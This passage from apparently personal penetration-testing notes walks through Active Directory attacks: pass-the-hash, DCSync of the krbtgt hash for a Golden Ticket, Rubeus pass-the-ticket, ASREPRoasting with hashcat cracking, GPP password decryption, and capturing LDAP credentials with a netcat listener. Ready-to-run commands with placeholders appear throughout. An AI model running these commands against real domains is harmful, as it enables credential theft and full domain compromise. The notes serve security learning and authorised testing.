zero@pio$ crackmapexec smb <DC IP> -u administrator -H <NTLM HASH>
```

We can also use the tool **getnthash.py** from PKINITtools to request the NT hash for our target host using Kerberos U2U to submit a TGS request with the **Privileged Attribute Certificate** (**PAC**), which contains the NT hash of the target. This can be decrypted with AS-REP encryption key.
```console
zero@pio$ python getnthash.py -key <NTLM HASH> <DOMAIN>.LOCAL/<DC COMPUTER NAME>$
```

We can use this hash to perform a DCSync:
```console
zero@pio$ secretsdump.py -just-dc-user <DOMAIN>/administrator "<COMPUTER NAME>$"@<DC IP> -hashes <HASH>
```

Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once:
```console
PS C:\zeropio> .\Rubeus.exe asktgt /user:<DC COMPUTER NAME>$ /certificate:<BASE64 CERT> /ptt
```

We can then type `klist` to confirm that the ticket is in memory:
```console
PS C:\zeropio> klist
```

Again, since Domain Controllers have replication privileges in the domain, we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. We can get the NT hash for KRBTGT account, to create a *Golden Ticket* and establish persistence:
```console
PS C:\zeropio> .\mimikatz.exe
mimikatz # lsadump::dcsync /user:<DOMAIN>\krbtgt
```

## Miscellaneous Misconfigurations 

### Exchange Related Group Membership 

In a default AD, the group **Exchange Windows Permissions** is not listed as a protected group, members can write a DACL to the domain object, to exploit DCSync. The Exchange group **Organization Management** can access mailboxes of all domain users. Often, sysadmins are member of this group. This group also has control over the OU called **Microsoft Exchange Security Groups**, which contains the group **Exchange Windows Permissions**.

### PrivExchange 

tHE **PrivExchange** attack is a flaw in the Exchange Server **PushSubscription** feature. This allows any domain user with a mailbox to force the Exchange server to authenticate any host over HTTP. The Exchange service runs as SYSTEM and is over-privileged by default. 

### Printer Bug 

The **Printer Bug** is a flaw in MS\_RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. Any domain user can connect to the spool's named pipe with the **RpcOpenPrinter** method and use the **RpcRemoteFindFirstPrinterChangeNotificationEx** method to forche the server to authenticate to any host over SMB. The spooler run as SYSTEM and is installed by default in WIndows servers with Desktop Experience. 

This attack can leveraged to realy to LDAP and grant a account DCSync privileges to retrieve all passwords hashes from AD. The attack can also be used to relay LDAP authentication and gran **Resource-Based Constrained Delegation** (**RBCD**) privileges for the victim to a computer account under our control, giving privileges to authentication as any user on the victim's computer.

This [tool](https://github.com/cube0x0/Security-Assessment) could help us. First, enumerating MS-PRN Printer Bug:
```console
PS C:\zeropio> Import-Module .\SecurityAssessment.ps1
PS C:\zeropio> Get-SpoolStatus -ComputerName <COMPUTER NAME>.<DOMAIN>.LOCAL
```

### MS14-068 

This was a flaw in Kerberos protocol, which could be leveraged along with standard domain user credentials to elevate privileges to Domain Admin. The vulnerability alloed a forged PAC to be accepted by the KDC as legitimate. A fake PAC can be created, presenting a user as a member of the Domian Administrators or other privileged group. The Impacket or tools like [PyKEK](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) can help us exploiting it.

### Sniffing LDAP Credentials 

Many applications and printers store the LDAP credentials in their web admin console. These consoles are often weak or with default passwords. These credentials can be viewed in cleartext. The **test connection** function can also be used to gather credentials by changing the LDAP IP address to our attack host, and setting a netcat listener on LDAP port 389. More info [here](https://grimhacker.com/2018/03/09/just-a-printer/). 

### Enumerating DNS Records 

With tools like [adidnsdump](https://github.com/dirkjanm/adidnsdump) we can enumerate all DNS records in a domain, using a valid domain user account. By default, all users can lis the child objects of a DNS zone in an AD. More information [here](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump). 

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.
```console
zero@pio$ adidnsdump -u <DOMAIN>\\<USER> ldap://<DC IP> 
```

If we run with the `-r` flag, the tool will attempt to resolve unknown records by performing **A** query. 

### Password in Description Field 

Sometimes sensitive information is display in **Description** or **Notes** fields:
```console
PS C:\zeropio> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

### PASSWD\_NOTREQD Field 

Sometimes domain accounts can have the [passwd\_notreqd](https://ldapwiki.com/wiki/PASSWD_NOTREQD) field set in the userAccountControl. If this is set, the user is not subject to the password policy length (they can even have empty passwords). We can enumerate them:
```console
PS C:\zeropio> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

### Credentials in SMB Shares and SYSVOL Scripts 

The **SYSVPOL** share can have sensitive data. Batch, VBSscript, PowerShell scripts... It is worth checking it.
```console
PS C:\zeropio> ls \\<COMPUTER NAME>\SYSVOL\<DOMAIN>.LOCAL\
```

We can use CrackMapExec and the `--local-auth` flag to test any credentials we found.

### Group Policy Preferences (GPP) Passwords 

When a new GPP is created, as well a xml file in SYSVOL share. THese file can include:
- Map drives (drives.xml)
- Create local users
- Create printer config files (printers.xml)
- Creating and updating services (services.xml)
- Creating scheduled tasks (scheduledtasks.xml)
- Changing local admin passwords

These files can contain an array of configuration data and defined passwords. The **cpassword** attribute, encrypted as AES-256 bit, can be decrypted as:
```console
zero@pio$ gpp-decrypt <CPASSWORD>
```

This GPP passwords can be found manually or by using [Get-GPPPasswords.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.
```console
zero@pio$ crackmapexec smb -L | grep gpp
```

It is also possible to find passwords in files such as Registry.xml when autologon is configured via Group Policy. We can hunt for this using CrackMapExec with the gpp\_autologin module, or using the Get-GPPAutologon.ps1 script included in PowerSploit.
```console
zero@pio$ crackmapexec smb <IP> -u <USER> -p <PASSWORD> -M gpp_autologin
```

### ASREPRoasting 

It is possible to obtain the TGT for any account with the **Do not requier Kerberos pre-authentication** enabled. ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. We can search the users with:
```console
PS C:\zeropio> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

If we found a user we can use Rubeus:
```console
PS C:\zeropio> .\Rubeus.exe asreproast /user:<USER> /nowrap /format:hashcat
```

And then crack with mode **18200**:
```console
zero@pio$ hashcat -m 18200 <HASH> <WORDLIST>
```

When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication:
```console
zero@pio$ kerbrute userenum -d <DOMAIN>.local --dc <DC IP> <WORDLIST>
```

We can use now [Get-NPUsers.py](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetNPUsers.py) to hunt all users with Kerberoast pre-authentication not required:
```console
zero@pio$ GetNPUsers.py <DOMAIN>.LOCAL/ -dc-ip <DC IP> -no-pass -usersfile valid_ad_users 
```

### Group Policy Object (GPO) Abuse 

Group Policy provides administrators with many advanced settings that can be applied to both user and computer objects in an AD environment.  GPO misconfigurations can be abused to perform the following attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can use tools like [Group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon) or [PingCastle](https://www.pingcastle.com/) to enumerate them. Or PowerView:
```console
PS C:\zeropio> Get-DomainGPO |select displayname
```

If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets:
```console
PS C:\zeropio> Get-GPO -All | Select DisplayName
```

Now we cna check if a user we control has any rights over a GPO:
```console
PS C:\zeropio> $sid=Convert-NameToSid "Domain Users"
PS C:\zeropio> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

Search by **WriteProperty** and **WriteDacl**. We can use GPO GUID to display the name of the GPO:
```console
PS C:\zeropio> Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

Some tools, like [SharpGOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) can help us.


